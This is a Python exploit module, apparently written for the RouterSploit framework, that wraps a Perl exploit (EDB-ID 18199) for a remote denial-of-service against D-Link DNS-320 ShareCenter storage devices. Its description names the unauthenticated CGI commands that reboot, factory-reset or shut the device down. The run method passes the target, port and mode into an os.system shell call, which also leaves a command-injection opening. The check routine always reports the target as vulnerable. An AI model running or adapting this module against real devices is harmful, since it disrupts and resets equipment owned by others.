
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "EDB-ID:18199",

        "description": " ShareCenter D-Link DNS-320 remote reboot/shutdown/reset (DoS).  "
                       "mode(0,1,2,3) "
                       "0 - dsk_mgr.cgi cmd=FMT_restart [Reboot]"
                       "1 - system_mgr.cgi cmd=cgi_restart [Reboot]"
                       "2 - wizard_mgr.cgi cmd=cgi_wizard [Reset]"
                       "3 - system_mgr.cgi cmd=shutdown [Shutdown]",

        "authors": (

            "rigan",  # vulnerability discovery

            "###",  # routersploit modules

        ),

        "references": (

            "https://www.exploit-db.com/exploits/18199",

        ),

        "devices": (

            "Dlink, EDB-ID:18199"
        ),
    }


    target = OptIP("", " target ip")
    port = OptPort("", "Target HTTP port")
    mode = OptString(""," choose(0~3) you can input 'show info' to view details ")
        
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            #print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {} {}'.format('exploit-db-18199.pl',self.target,self.port,self.mode)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True